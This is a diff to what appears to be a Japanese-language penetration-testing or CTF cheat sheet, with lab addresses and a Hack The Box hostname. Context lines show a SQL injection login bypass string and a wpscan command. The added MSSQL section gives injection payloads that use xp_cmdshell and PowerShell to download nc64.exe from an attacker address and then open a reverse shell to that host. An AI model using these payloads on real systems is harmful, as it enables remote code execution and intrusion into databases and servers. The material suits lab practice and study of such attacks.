@@ -110,6 +110,12 @@ http://192.168.213.121 [200 OK] ASP_NET[4.0.30319], Bootstrap, Country[RESERVED]
 ログイン画面で利用  
 ユーザ名、パスワードに **admin'or'1'='1** を利用  
 
+### MSSQL
+```
+' exec xp_cmdshell "powershell -c iwr -uri http://192.168.45.222/nc64.exe -Outfile c:\windows\temp\nc.exe"-- 
+' exec xp_cmdshell "powershell -c c:\Windows\Temp\nc.exe -e cmd.exe 192.168.45.222 1234"-- 
+```
+
 ### WordPress
 ```
 wpscan --url https://brainfuck.htb --disable-tls-checks
